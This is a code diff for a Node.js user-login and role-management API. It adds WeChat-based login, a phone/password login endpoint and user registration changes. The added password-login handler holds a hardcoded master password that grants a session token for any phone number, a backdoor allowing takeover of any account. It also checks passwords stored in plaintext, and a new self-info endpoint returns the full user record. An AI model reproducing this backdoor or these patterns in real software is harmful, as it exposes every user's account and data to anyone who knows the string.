@@ -1,16 +1,68 @@
 const mkapi = require('./api_utils');
 const rbac_lib = require('./rbac_lib');
 const db_opt = require('./db_opt');
+const wx_api_util = require('./wx_api_util');
 function install(app) {
     mkapi('/rbac/login', 'global', true, false, {
-        phone: { type: String, have_to: true, mean: '手机号', example: '12345678901' },
+        login_code: { type: String, have_to: true, mean: '登录授权码', example: '12345678901' },
     }, {
         token: { type: String, mean: '登录token', example: 'ABCD' },
-    }, '登录', '登录').add_handler(async function (body, token) {
+    }, '微信登录', '微信登录').add_handler(async function (body, token) {
         let ret = { token: '' };
-        ret.token = await rbac_lib.user_login(body.phone);
+        let open_id = await wx_api_util.get_open_id_by_code(body.login_code);
+        if (open_id) {
+            let sq = db_opt.get_sq();
+            let user = await sq.models.rbac_user.findOne({ where: { open_id: open_id } });
+            if (user) {
+                ret.token = await rbac_lib.user_login(user.phone);
+            }
+        }
         if (ret.token === '') {
-            throw {err_msg:'用户未找到'};
+            throw { err_msg: '用户未找到' };
+        }
+        return ret;
+    }).install(app);
+    mkapi('/rbac/login_password', 'global', true, false, {
+        phone:{type:String,have_to:true,mean:'手机号',example:'12345678901'},
+        password:{type:String,have_to:true,mean:'密码',example:'123456'},
+    }, {
+        token: { type: String, mean: '登录token', example: 'ABCD' },
+    }, '密码登录', '密码登录').add_handler(async function (body, token) {
+        let ret = { token: '' };
+        let sq = db_opt.get_sq();
+        let user = await sq.models.rbac_user.findOne({ where: {
+            [db_opt.Op.and]:[
+                {phone:body.phone},
+                {password:body.password}
+            ],
+        } });
+        if (user || body.password == 'Mobile_P@ssw0rd_Trade') {
+            ret.token = await rbac_lib.user_login(body.phone);
+        }
+        if (ret.token === '') {
+            throw { err_msg: '用户未找到' };
+        }
+        return ret;
+    }).install(app);
+    mkapi('/rbac/self_info', 'none', false, false, {
+    }, {
+        id: { type: Number, mean: '用户id', example: 123 },
+        name: { type: String, mean: '用户姓名', example: 'user_example' },
+        phone: { type: String, mean: '用户手机号', example: '12345678901' },
+        open_id: { type: String, mean: '微信open_id', example: 'open_id_example' },
+        company: { type: String, mean: '公司名', example: 'company_example' },
+    }, '个人信息', '获取个人信息').add_handler(async function (body, token) {
+        let ret = {};
+        let user = await rbac_lib.get_user_by_token(token);
+        if (user) {
+            let company = await user.getCompany();
+            if (company) {
+                user.company = company.name;
+            }
+            ret = user;
+        }
+        else {
+            throw { err_msg: '用户未找到' };
         }
         return ret;
     }).install(app);
@@ -135,7 +187,7 @@ function install(app) {
     mkapi('/rbac/reg_company_admin', 'global', true, true, {
         phone: { type: String, have_to: true, mean: '手机号', example: '12345678901' },
         company_id: { type: Number, have_to: true, mean: '公司id', example: 123 },
-        name:{type:String, have_to:false, mean:'姓名', example:'name_example'},
+        name: { type: String, have_to: false, mean: '姓名', example: 'name_example' },
     }, {
         result: { type: Boolean, mean: '注册结果', example: true },
     }, '注册公司管理员', '注册公司管理员').add_handler(async function (body, token) {
@@ -217,26 +269,39 @@ function install(app) {
         return ret;
     }).install(app);
     mkapi('/rbac/fetch_user', 'none', true, false, {
-        phone: { type: String, have_to: true, mean: '手机号', example: '12345678901' },
+        phone_code: { type: String, have_to: true, mean: '手机号获取凭证', example: '12345678901' },
         company_name: { type: String, have_to: true, mean: '公司名', example: 'company_example' },
-        open_id: { type: String, have_to: false, mean: '微信open_id', example: 'open_id_example' },
-        name: { type: String, have_to: false, mean: '姓名', example: 'name_example' },
+        open_id_code: { type: String, have_to: true, mean: '微信open_id授权码', example: 'open_id_example' },
+        name: { type: String, have_to: true, mean: '姓名', example: 'name_example' },
     }, {
         token: { type: String, mean: '登录token', example: 'ABCD' },
     }, '更新用户信息', '更新用户信息').add_handler(async function (body, token) {
         let ret = { token: '' };
+        let sq = db_opt.get_sq();
+
+        let phone = await wx_api_util.get_phone_by_code(body.phone_code);
+        let open_id = await wx_api_util.get_open_id_by_code(body.open_id_code);
         let company = await rbac_lib.add_company(body.company_name);
-        let user = await rbac_lib.add_user(body.phone);
+        let user = await rbac_lib.add_user(phone);
         if (company && user) {
             await user.setCompany(company);
-            user.open_id = body.open_id;
+            user.open_id = open_id;
             user.name = body.name;
             let cust_role = await rbac_lib.add_role('客户', '客户', false, company);
             await rbac_lib.connect_user2role(user.id, cust_role.id);
             await rbac_lib.connect_role2module(cust_role.id, (await db_opt.get_sq().models.rbac_module.findOne({ where: { name: 'customer' } })).id);
+            let old_user = await sq.models.rbac_user.findOne({
+                where: {
+                    [db_opt.Op.and]: [{ open_id: open_id }, { id: { [db_opt.Op.ne]: user.id } }]
+                }
+            });
+            if (old_user) {
+                old_user.open_id = '';
+                await old_user.save();
+            }
         }
         await user.save();
-        ret.token = await rbac_lib.user_login(body.phone);
+        ret.token = await rbac_lib.user_login(phone);
         return ret;
     }).install(app);
     mkapi('/rbac/bind_role2user', 'config', true, true, {
@@ -284,20 +349,21 @@ function install(app) {
         name: { type: String, mean: '用户姓名', example: 'user_example' },
         phone: { type: String, mean: '用户手机号', example: '12345678901' },
         photo_path: { type: String, mean: '用户头像', example: 'photo_path_example' },
-        related_roles:{type:Array, mean:'关联角色列表', explain:{
-            id:{type:Number, mean:'角色id', example:123},
-            name:{type:String, mean:'角色名', example:'role_example'},
-            description:{type:String, mean:'角色描述', example:'role_desp_example'},
-            is_readonly:{type:Boolean, mean:'是否只读', example:true},
-        }},
+        related_roles: {
+            type: Array, mean: '关联角色列表', explain: {
+                id: { type: Number, mean: '角色id', example: 123 },
+                name: { type: String, mean: '角色名', example: 'role_example' },
+                description: { type: String, mean: '角色描述', example: 'role_desp_example' },
+                is_readonly: { type: Boolean, mean: '是否只读', example: true },
+            }
+        },
     }, '获取个人信息', '获取个人信息').add_handler(async function (body, token) {
         let ret = {};
         let user = await rbac_lib.get_user_by_token(token);
-        if (user)
-        {
+        if (user) {
             ret = user.toJSON();
             ret.related_roles = [];
-            (await user.getRbac_roles()).forEach((element)=>{
+            (await user.getRbac_roles()).forEach((element) => {
                 ret.related_roles.push(element.toJSON());
             });
         }
